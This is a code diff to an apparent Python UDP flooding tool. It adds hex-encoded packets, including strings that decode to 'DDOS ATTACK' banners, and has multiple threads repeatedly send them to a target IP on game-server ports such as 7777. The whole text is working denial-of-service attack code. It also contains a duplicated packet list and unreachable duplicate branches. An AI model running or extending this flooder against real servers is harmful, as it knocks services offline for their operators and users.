@@ -13,6 +13,25 @@ orgip =ip
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                        codecs.decode("53414d509538e1a9611e69","hex_codec"),#u
+                       codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"),#i
+                       codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"),#u
+                       codecs.decode("5448454a415920582058414c4241444f52202d3e2041545441434b202d3e204558504c4f4954202d3e20534552564552202d3e20554450","hex_codec"),#asu
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("021efd40","hex_codec"),#cookie port 1111
+                       codecs.decode("35342c38302c3232","hex_codec"),#cookie port 7771 
+                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
+                       ]
+
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#u
+                       codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"),#i
+                       codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"),#u
+                       codecs.decode("5448454a415920582058414c4241444f52202d3e2041545441434b202d3e204558504c4f4954202d3e20534552564552202d3e20554450","hex_codec"),#asu
                        codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                        codecs.decode("081e62da","hex_codec"), #cookie port 7796
                        codecs.decode("081e77da","hex_codec"),#cookie port 7777
@@ -57,6 +76,13 @@ class MyThread(threading.Thread):
                 
                 
                 if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
                     sock.sendto(Pacotes[5], (ip, int(port)))
                 elif(int(port) == 7796):
                     sock.sendto(Pacotes[4], (ip, int(port)))
@@ -105,6 +131,13 @@ class MyThread1(threading.Thread):
                 
                 if(int(port) == 7777):
                     sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
                 elif(int(port) == 7796):
                     sock.sendto(Pacotes[4], (ip, int(port)))
                 elif(int(port) == 7771):
@@ -150,6 +183,13 @@ class MyThread2(threading.Thread):
                 
                 
                 if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
                     sock.sendto(Pacotes[5], (ip, int(port)))
                 elif(int(port) == 7796):
                     sock.sendto(Pacotes[4], (ip, int(port)))
@@ -198,6 +238,13 @@ class MyThread3(threading.Thread):
                 
                 if(int(port) == 7777):
                     sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
                 elif(int(port) == 7796):
                     sock.sendto(Pacotes[4], (ip, int(port)))
                 elif(int(port) == 7771):
@@ -244,6 +291,13 @@ class MyThread4(threading.Thread):
                 
                 if(int(port) == 7777):
                     sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
                 elif(int(port) == 7796):
                     sock.sendto(Pacotes[4], (ip, int(port)))
                 elif(int(port) == 7771):
@@ -289,6 +343,31 @@ class MyThread5(threading.Thread):
                 
                 
                 if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    sock.sendto(Pacotes[3], (ip, int(port)))
+                    sock.sendto(Pacotes[5], (ip, int(port)))
                     sock.sendto(Pacotes[5], (ip, int(port)))
                 elif(int(port) == 7796):
                     sock.sendto(Pacotes[4], (ip, int(port)))
